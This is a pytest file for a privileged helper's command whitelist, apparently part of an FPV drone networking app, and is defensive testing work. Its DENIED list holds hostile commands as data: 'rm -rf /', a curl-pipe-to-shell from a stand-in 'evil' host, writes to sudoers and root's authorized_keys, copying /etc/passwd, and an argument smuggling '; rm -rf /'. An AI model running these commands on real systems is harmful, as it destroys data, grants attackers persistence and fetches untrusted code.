"""Tests for the privileged helper command whitelist."""

import pytest

from app.security.privd_policy import allowed_programs, is_allowed

ALLOWED = [
    ["ip", "route", "add", "default", "via", "192.168.1.1", "dev", "wlan0"],
    ["ip", "link", "set", "wlan0", "mtu", "1400"],
    ["ip", "link", "set", "wlan0", "txqueuelen", "10000"],
    ["ip", "link", "set", "ifbwlan0", "up"],
    ["ip", "link", "add", "ifbwlan0", "type", "ifb"],
    ["ip", "rule", "del", "fwmark", "0x100", "table", "100"],
    ["ip", "rule", "show"],
    ["ip", "-force", "-batch", "-"],
    ["ip", "-o", "-4", "addr", "show"],
    ["tc", "qdisc", "replace", "dev", "wlan0", "root", "cake"],
    ["tc", "-s", "qdisc", "show", "dev", "wlan0", "root"],
    ["tc", "filter", "add", "dev", "wlan0", "parent", "ffff:", "protocol", "ip"],
    ["iptables", "-t", "mangle", "-A", "POSTROUTING", "-j", "MARK"],
    ["iptables-restore", "--noflush"],
    ["sysctl", "-w", "net.ipv4.tcp_congestion_control=bbr"],
    ["ethtool", "-s", "wlan0", "wol", "d"],
    ["systemctl", "restart", "fpvcopilot-sky"],
    ["systemctl", "start", "--no-block", "fpvcopilot-update"],
    ["tailscale", "up", "--accept-routes"],
    ["nmcli", "device", "wifi", "connect", "MySSID"],
    ["tee", "/etc/resolv.conf"],
    ["tee", "-a", "/etc/iproute2/rt_tables"],
    ["mkdir", "-p", "/etc/dnsmasq.d"],
    ["cp", "/etc/resolv.conf", "/etc/resolv.conf.backup"],
    ["killall", "-HUP", "dnsmasq"],
    ["apt-get", "install", "-y", "dnsmasq"],
    ["journalctl", "-u", "fpvcopilot-sky", "-n", "50", "--no-pager"],
    ["journalctl", "-u", "dnsmasq", "-n", "50", "--no-pager"],
    ["ping", "-c", "1", "-W", "1", "127.0.0.1"],
    ["ping", "-c", "1", "-W", "2", "-I", "wlan0", "192.168.1.1"],
    ["ping", "-c", "3", "-W", "3", "-q", "8.8.8.8"],
    ["modprobe", "ifb", "numifbs=4"],
]

DENIED = [
    [],
    ["rm", "-rf", "/"],
    ["bash", "-c", "id"],
    ["sh", "-c", "curl evil | sh"],
    ["tee", "/etc/sudoers.d/evil"],
    ["tee", "/root/.ssh/authorized_keys"],
    ["mkdir", "-p", "/etc/evil"],
    ["cp", "/etc/passwd", "/tmp/x"],
    ["sysctl", "-w", "kernel.sysrq=1"],
    ["ip", "-force", "-batch", "/tmp/evil"],
    ["systemctl", "restart", "sshd"],
    ["apt-get", "install", "nginx"],
    ["/usr/bin/python3", "-c", "print(1)"],
    # Tightened in P7:
    ["ip", "rule", "flush"],
    ["ip", "rule", "del", "all"],
    ["ip", "link", "set", "wlan0", "name", "evil"],
    ["ip", "link", "set", "wlan0", "address", "aa:bb:cc:dd:ee:ff"],
    ["ip", "link", "add", "br0", "type", "bridge"],
    ["tc", "foo", "bar"],
    ["journalctl", "-u", "fpvcopilot-sky", "-u", "sshd"],
    ["ping", "-f", "8.8.8.8"],
    ["ping", "--flood", "8.8.8.8"],
    ["modprobe", "ifb", "numifbs=1; rm -rf /"],
]


@pytest.mark.parametrize("argv", ALLOWED)
def test_allows_expected(argv):
    assert is_allowed(argv) is True


@pytest.mark.parametrize("argv", DENIED)
def test_denies_dangerous(argv):
    assert is_allowed(argv) is False


def test_allowed_programs_non_empty():
    programs = allowed_programs()
    assert "ip" in programs
    assert "systemctl" in programs
